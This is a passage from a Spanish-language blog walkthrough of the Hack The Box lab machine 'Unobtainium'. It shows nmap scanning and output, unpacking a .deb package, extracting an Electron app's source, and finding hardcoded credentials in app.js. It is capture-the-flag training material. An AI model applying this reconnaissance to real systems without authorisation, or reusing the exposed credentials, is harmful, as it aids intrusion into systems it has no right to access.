&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.hackingarticles.in/ssh-penetration-testing-port-22/&quot;&gt;SSH&lt;/a&gt;&lt;/strong&gt;: Posibilidad de obtener una Shell de manera segura.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://searchnetworking.techtarget.com/definition/port-80&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Servidor web.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2379&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.redhat.com/es/topics/containers/what-is-etcd&quot;&gt;etcd&lt;/a&gt;&lt;/strong&gt;: Almac√©n de datos de &lt;strong&gt;Kubernetes&lt;/strong&gt;.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2380&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://etcd.io/&quot;&gt;etcd&lt;/a&gt;&lt;/strong&gt;: Almac√©n de datos de &lt;strong&gt;Kubernetes&lt;/strong&gt;.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.digicert.com/es/what-is-ssl-tls-https/&quot;&gt;HTTPS&lt;/a&gt;&lt;/strong&gt;: Servidor web con certificado que lo hace m√°s ‚Äúseguro‚Äù.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10250&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No lo sabemos a√∫n&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10256&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No lo sabemos tampoco :P&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;31337&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;En &lt;a href=&quot;https://www.speedguide.net/port.php?port=31337&quot;&gt;internet dicen&lt;/a&gt; que se usa para almacenar backdoors, pero pues no estamos seguros de que contiene a√∫n.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Teniendo los puertos, vamos a escanear ahora en b√∫squeda de versiones y scripts relacionados con esos servicios:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;~(Usando la funci√≥n &lt;code&gt;extractPorts&lt;/code&gt; (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.235
    [*] Open ports: 22,80,2379,2380,8443,10250,10256,31337

[*] Ports copied to clipboard
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;)~&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV 10.10.10.235 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat portScan
# Nmap 7.80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV -oN portScan 10.10.10.235
Nmap scan report for 10.10.10.235
Host is up (0.11s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
2380/tcp  open  ssl/etcd-server?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 30 Jun 2021 17:06:18 GMT
|     Content-Length: 212
|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 30 Jun 2021 17:06:17 GMT
|     Content-Length: 189
|_    {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot options path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-06-29T16:59:25
|_Not valid after:  2022-06-30T16:59:25
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Not valid before: 2021-01-17T05:37:08
|_Not valid after:  2022-01-17T05:37:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31337/tcp open  http             Node.js Express framework
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/30%Time=60DCA3A3%P=x86_64-pc-linux-gn
SF:u%r(HTTPOptions,203,&quot;HTTP/1....................................20Reques
...
# cositas que no nos sirven
...
SF:t&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 234.27 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos destacar algunas cosas:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache httpd 2.4.41&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2379&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTPS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No esta seguro, pero vamos a quedarnos con ese resultado: etcd-client&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2380&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTPS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Igual, vamos a quedarnos con ese resultado: etcd-server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;8443&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTPS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No nos muestra&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Un formato &lt;code&gt;json&lt;/code&gt; algo interesante:&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  ...
  &quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,
  ...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Vemos un archivo que quiz√°s sea relevante como pueda que no, guard√©moslo: &lt;code&gt;/Trinity.txt.bak&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Un dominio &lt;code&gt;control-plane.minikube.internal&lt;/code&gt;, realmente varios, pero este me llama la atenci√≥n.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10250&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTPS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Golang net/http server (Go-IPFS json-rpc or InfluxDB API)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Un nombre de servidor algo extra√±o: &lt;code&gt;unobtainium@1610865428&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10256&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Golang net/http server (Go-IPFS json-rpc or InfluxDB API)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;31337&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTPS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Node.js Express framework&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Opa, bastantes cositas, pues empecemos a jugar con cada uno a ver por donde le damos duro a esta m√°quina.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338page80.png&quot; alt=&quot;338page80&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una web sencilla describi√©ndonos una aplicaci√≥n para chatear‚Ä¶ Vemos 4 botones, los 4 contienen redirects:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;- Unobtainium nos lleva a http://10.10.10.235/downloads/checksums.txt
- Download deb a http://10.10.10.235/downloads/unobtainium_debian.zip
- Download rpm a http://10.10.10.235/downloads/unobtainium_redhat.zip
- Download snap a http://10.10.10.235/downloads/unobtainium_snap.zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vamos al link de &lt;strong&gt;Unobtainium&lt;/strong&gt; encontramos los hashes correspondientes a cada binario subido (que supongo estar√°n dentro de los &lt;code&gt;.zip&lt;/code&gt;), estos hashes nos &lt;strong&gt;sirven para comprobar que lo que descarguemos no ha sido modificado en el proceso&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338page80_checksums.png&quot; alt=&quot;338page80_checksums&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;jugando-con-unobtainium_debianzip&quot;&gt;Jugando con unobtainium_debian.zip&lt;/h3&gt;

&lt;p&gt;¬øPor qu√© el de Debian? Bueno, estoy en &lt;strong&gt;ParrotOS&lt;/strong&gt; y es un sistema operativo basado en &lt;strong&gt;Debian&lt;/strong&gt; y &lt;code&gt;deb&lt;/code&gt; hace referencia a los paquetes de software para &lt;u&gt;Deb&lt;/u&gt;ian.&lt;/p&gt;

&lt;p&gt;Lo descargamos en la m√°quina, lo descomprimimos y obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ls 
unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hacemos la comprobacion de hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.235/downloads/checksums.txt | grep deb
c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
‚ù± md5sum unobtainium_1.0.0_amd64.deb
c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo, todo perfecto con el paquete, es el original.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enum-deb-withar&quot;&gt;Abrimos el paquete &lt;u&gt;.deb&lt;/u&gt; &lt;a href=&quot;#enum-deb-withar&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Algo que encontr√© bastante interesante fue que &lt;a href=&quot;https://www.cyberciti.biz/faq/how-to-extract-a-deb-file-without-opening-it-on-debian-or-ubuntu-linux/&quot;&gt;los paquetes &lt;strong&gt;&lt;u&gt;.deb&lt;/u&gt;&lt;/strong&gt; traen consigo 3 archivos&lt;/a&gt; que son los que contienen lo que se va a instalar en el sistema:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;debian-binary&lt;/code&gt; que contiene la versi√≥n del paquete &lt;code&gt;.deb&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;control.tar.gz&lt;/code&gt; que tiene algunos hashes y los controles para la construcci√≥n del paquete.&lt;/li&gt;
  &lt;li&gt;Y &lt;code&gt;data.tar.gz&lt;/code&gt; que contiene todos los archivos a ser instalados.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para verlos, podemos jugar con la herramienta &lt;a href=&quot;https://www.geeksforgeeks.org/ar-command-in-linux-with-examples/&quot;&gt;ar&lt;/a&gt; y su par√°metro &lt;code&gt;t&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ar t unobtainium_1.0.0_amd64.deb 
debian-binary
control.tar.gz
data.tar.xz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y para extraerlos del paquete usamos el par√°metro &lt;code&gt;x&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ar x unobtainium_1.0.0_amd64.deb
‚ù± ls
control.tar.gz  data.tar.xz  debian-binary  unobtainium_1.0.0_amd64.deb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, ahora para extraer el contenido de esos comprimidos jugamos con &lt;code&gt;tar&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;üî¶ &lt;strong&gt;&lt;u&gt;control&lt;/u&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± tar xvf control.tar.gz 
./
./postinst
./postrm
./control
./md5sums
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üî¶ &lt;strong&gt;&lt;u&gt;data&lt;/u&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± tar xvf data.tar.xz
./
./usr/
./usr/share/
...
...
...
./opt/unobtainium/LICENSES.chromium.html
./opt/unobtainium/libvk_swiftshader.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, enumerando los dos encontramos algunas cosas muy lindas‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;inside-data-tar-gz&quot;&gt;Exploramos el contenido de &lt;u&gt;data.tar.gz&lt;/u&gt; &lt;a href=&quot;#inside-data-tar-gz&quot;&gt;üß∑&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Nos extrae dos carpetas, &lt;code&gt;/usr&lt;/code&gt; (que tiene el icono del programa y cosas de cara al usuario) y &lt;code&gt;/opt&lt;/code&gt; (que tiene todos los archivos necesarios para instalar el binario y su correcto funcionamiento)‚Ä¶&lt;/p&gt;

&lt;p&gt;Bas√°ndome en una m√°quina que hicimos que usaba &lt;strong&gt;Electron&lt;/strong&gt; record√© que existe un archivo &lt;code&gt;.asar&lt;/code&gt; el cual contiene todos los fuentes y c√≥digo con el que fue creado alg√∫n proyecto.&lt;/p&gt;

&lt;p&gt;Pues buscandoooo lo encontramos en &lt;code&gt;/opt/unobtainium/resources&lt;/code&gt; (: Ya con ese archivo podemos aprovechar el uso de un m√≥dulo de &lt;strong&gt;node&lt;/strong&gt; para obtener el c√≥digo fuente de la aplicaci√≥n, en este caso del binario &lt;strong&gt;unobtainium&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37&quot;&gt;How to get the source code of any electron application&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Siguiendo los pasos de ese recurso logramos extraer varios archivos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± mkdir files_unobtainium
‚ù± asar extract app.asar files_unobtainium/
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cd files_unobtainium/
‚ù± ls
index.js  package.json  src
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Viendo el archivo &lt;code&gt;package.json&lt;/code&gt; obtenemos un posible usuario, vemos un dominio y un email:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;‚ù± cat package.json
{
  &quot;name&quot;: &quot;unobtainium&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;description&quot;: &quot;client&quot;,
  &quot;main&quot;: &quot;index.js&quot;,
  &quot;homepage&quot;: &quot;http://unobtainium.htb&quot;,
  &quot;author&quot;: &quot;felamos &amp;lt;felamos@unobtainium.htb&amp;gt;&quot;,
  &quot;license&quot;: &quot;ISC&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la carpeta &lt;code&gt;src/&lt;/code&gt; est√°n todos los archivos usados por la aplicaci√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± tree src/
src/
‚îú‚îÄ‚îÄ css
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bootstrap.min.css
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ dashboard.css
‚îú‚îÄ‚îÄ get.html
‚îú‚îÄ‚îÄ index.html
‚îú‚îÄ‚îÄ js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ app.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bootstrap.bundle.min.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Chart.min.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ check.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ dashboard.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ feather.min.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ get.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ jquery.min.js
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ todo.js
‚îú‚îÄ‚îÄ post.html
‚îî‚îÄ‚îÄ todo.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;No vamos a repasar todos, pero si destacaremos cositas‚Ä¶&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Por ejemplo el archivo &lt;code&gt;src/js/app.js&lt;/code&gt; toma el valor de una variable llamada &lt;code&gt;message&lt;/code&gt; y lo sube (m√©todo &lt;strong&gt;PUT&lt;/strong&gt;) al servicio &lt;code&gt;http://unobtainium.htb:31337/&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;$(document).ready(function(){
    $(&quot;#but_submit&quot;).click(function(){
        var message = $(&quot;#message&quot;).val().trim();
        $.ajax({
        url: 'http://unobtainium.htb:31337/',
        type: 'put',
        dataType:'json',
        contentType:'application/json',
        processData: false,
        data: JSON.stringify({&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;message&quot;: {&quot;text&quot;: message}}),
        success: function(data) {
            //$(&quot;#output&quot;).html(JSON.stringify(data));
            $(&quot;#output&quot;).html(&quot;Message has been sent!&quot;);
        }
    });
});
});
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Adem√°s del peque√±o detalle que tenemos unas credenciales&lt;/strong&gt; üò≤&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Pues veamos esto en funcionamiento‚Ä¶&lt;/p&gt;

&lt;p&gt;Ya vimos los fuentes y no hay nada extra√±o que nos haga pensar que vamos a ser espiados :P instal√©mosla:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± dpkg -i unobtainium_1.0.0_amd64.deb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despu√©s de unos segundos ya lo tendr√≠amos instalado en el sistema, lo ejecutamos y obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB.png&quot; alt=&quot;338bash_exec_unobtainiumDEB&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Es una aplicaci√≥n creada con &lt;a href=&quot;https://www.electronjs.org/&quot;&gt;&lt;strong&gt;Electron&lt;/strong&gt;&lt;/a&gt; (ya hemos visto cositas de √©l en otro post que no rese√±o para no spoiler la m√°quina en la que se usa, pero esta por ac√°).&lt;/p&gt;

&lt;p&gt;Al abrirlo nos indica que no encuentra el dominio &lt;code&gt;unobtainium.htb&lt;/code&gt;, pues agreg√°ndolo al archivo &lt;a href=&quot;https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html&quot;&gt;/etc/hosts&lt;/a&gt; se soluciona:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat /etc/hosts
...
10.10.10.235  unobtainium.htb
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_done.png&quot; alt=&quot;338bash_exec_unobtainiumDEB_done&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto nos da a entender que el software se esta comunicando para X cosa con la direcci√≥n IP &lt;code&gt;10.10.10.235&lt;/code&gt;, o sea, la m√°quina (&lt;strong&gt;ya vimos en los archivos del paquete el porqu√©&lt;/strong&gt;)‚Ä¶&lt;/p&gt;

&lt;p&gt;Dando algunas vueltas y clics llegamos al apartado &lt;strong&gt;Todo&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_todo.png&quot; alt=&quot;338bash_exec_unobtainiumDEB_todo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tenemos una lista de tareas, pero me dejan m√°s perdido de lo que estaba, as√≠ que segu√≠ probando el software y caemos en &lt;strong&gt;Post Messages&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_postMessages.png&quot; alt=&quot;338bash_exec_unobtainiumDEB_postMessages&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Que si recordamos estaba el archivo &lt;code&gt;app.js&lt;/code&gt; que era el encargado de esta parte, la de postear los mensajes en la ruta &lt;code&gt;http://unobtainium.htb:31337/&lt;/code&gt;.&lt;/p&gt;

